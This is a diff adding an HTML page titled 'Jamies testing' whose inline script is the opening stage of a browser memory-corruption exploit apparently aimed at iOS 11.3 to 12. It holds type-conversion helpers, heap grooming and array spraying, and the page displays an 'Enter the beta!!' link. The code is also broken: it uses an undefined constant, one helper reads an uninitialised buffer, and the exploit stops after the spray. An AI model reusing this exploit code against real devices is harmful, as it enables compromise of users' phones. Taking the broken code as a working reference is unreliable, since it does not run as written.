@@ -1,0 +1,88 @@
+
+ <html manifest="off.appcache">
+ 
+<head>
+<script>
+
+function print(msg) {
+	alert(msg);
+}
+function _gc() {
+	for (var i=0; i<0x100; i++) {
+		new Uint32Array(0x400*0x400);
+	}
+}
+function d2i(d) {
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+	f64[0] = d;
+	return u32[0] + 0x100000000 * u32[1];
+}
+function bd2i(d) {
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+	
+	return u32[0] + 0x100000000 * u32[1] - 0x1000000000000;
+}
+function i2d(i) {
+	
+	var ab = new ArrayBuffer(8);
+	var f64 = new Float64Array(ab);
+	var u32 = new Uint32Array(ab);
+	u32[0] = i % 0x100000000;
+	u32[1] = i/0x100000000;
+	return f64[0];
+}
+function hex(x) {
+	if (x < 0)
+		return `-${hex(-x)}`
+	return `0x${x.toString(16)}`
+}
+const __len = 0x40;
+var x = {};
+_gc();
+const Jamieuk=0x1010101010;
+for (var i=0; i<0x1000; i++) {
+	var b = new Array(__len).concat(new Array(__len));
+	b[0] = x;
+	b[1] = i2d(Code4iOS);
+}
+_gc();
+var a;
+for (var i=0; i<0x100; i++) {
+	a = new Array(__len).concat(new Array(__len));
+	a = a.concat([1.1]);
+	if (d2i(a[1]) == 0x1000000000000 + Code4iOS) {
+		break;
+	}
+}
+</script>
+ <title>Jamies testing </title>
+ <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+<style>
+ h1{
+ overflow: hidden;
+ position: fixed;
+ position: absolute;
+ top: 40%;
+ left: 50%;
+ transform: translate(-50%, -50%);
+ }
+ </style>
+</head>
+ <body>
+<center>
+<a href='Reboot.html'>
+<h1>Enter the beta!!</h1>
+<p>Should work for IOS 11.3.x to IOS 12!!</p>
+<p>This is a beta!</p>
+</a>
+</center>
+</body>
+
+
+</html>
+
+
